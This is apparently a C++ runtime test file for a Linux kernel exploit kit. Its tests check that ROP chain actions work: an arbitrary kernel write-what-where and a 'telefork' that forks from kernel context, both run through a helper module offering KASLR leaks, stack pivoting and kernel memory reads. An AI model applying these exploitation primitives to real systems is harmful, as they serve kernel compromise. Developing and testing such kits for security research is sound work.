#pragma once

#include <sys/wait.h>
#include "test/kpwn/Kpwn.cpp"
#include "test/TestSuite.cpp"
#include "test/TestUtils.cpp"
#include "util/HexDump.cpp"
#include "util/error.cpp"
#include "payloads/Payload.cpp"

class RopActionTests: public TestSuite {
    Kpwn* kpwn_;
public:
    RopActionTests(): TestSuite("RopActionRuntimeTests", "RopAction runtime tests") { }

    void init() {
        kpwn_ = &env->GetKpwn();
    }

    TEST_METHOD(writeWhatWhereTest, "WRITE_WHAT_WHERE_64 is working") {
        auto target = env->GetTarget();
        auto kaslr_base = kpwn_->KaslrLeak();
        auto rip_recovery = kpwn_->GetRipControlRecoveryAddr();

        uint64_t new_value = 0x1122334455667788;

        Payload p(40);

        auto target_offs = 16;
        auto target_buf_addr = kpwn_->AllocBuffer(p.GetData(), true);

        RopChain rop(target, kaslr_base);
        rop.AddRopAction(RopActionId::WRITE_WHAT_WHERE_64, {target_buf_addr + target_offs, new_value});
        rop.Add(rip_recovery);

        auto rop_buf_addr = kpwn_->AllocBuffer(rop.GetData(), true);
        kpwn_->SetRspAndRet(rop_buf_addr);
        kpwn_->Kfree(rop_buf_addr);

        auto buf_leak = kpwn_->Read(target_buf_addr, p.Size());
        Log("Leaked buffer:\n%s", HexDump::Dump(buf_leak).c_str());
        kpwn_->Kfree(target_buf_addr);

        for (int i = 0; i < p.Size(); i += 8)
            ASSERT_EQ(i == target_offs ? new_value : 0, *((uint64_t*)&buf_leak[i]));
    }

    TEST_METHOD(teleforkTest, "TELEFORK is working, its stack usage is in expected range") {
        auto target = env->GetTarget();
        auto kaslr_base = kpwn_->KaslrLeak();
        auto rip_recovery = kpwn_->GetRipControlRecoveryAddr();
        auto orig_pid = getpid();

        RopChain rop(target, kaslr_base);
        rop.AddRopAction(RopActionId::TELEFORK, {2000});
        rop.Add(rip_recovery);

        Payload p(4096);
        auto rop_offs = p.Size() - rop.GetByteSize();
        p.Set(rop_offs, rop.GetData());

        auto buf_addr = kpwn_->AllocBuffer(p.GetData(), true);
        Log("buf_addr = 0x%lx", buf_addr);

        kpwn_->SetRspAndRet(buf_addr + rop_offs);
        if (getpid() != orig_pid)
            exit(123);

        int status;
        if (wait(&status) == -1 || !WIFEXITED(status) || WEXITSTATUS(status) != 123)
            throw ExpKitError("No child was forked.");

        auto used_stack = kpwn_->Read(buf_addr, rop_offs);
        Log("Stack content:\n%s", HexDump::Dump(used_stack).c_str());
        kpwn_->Kfree(buf_addr);

        int non_used_bytes = 0;
        for (; non_used_bytes < used_stack.size(); non_used_bytes++)
            if (used_stack[non_used_bytes] != 0)
                break;

        auto used_stack_size = used_stack.size() - non_used_bytes;
        if (used_stack_size < 1800 || used_stack_size > 2312)
            throw ExpKitError("Expected telefork to use stack size between 1800 .. 2312 bytes, but it used %u bytes", used_stack_size);
    }
};
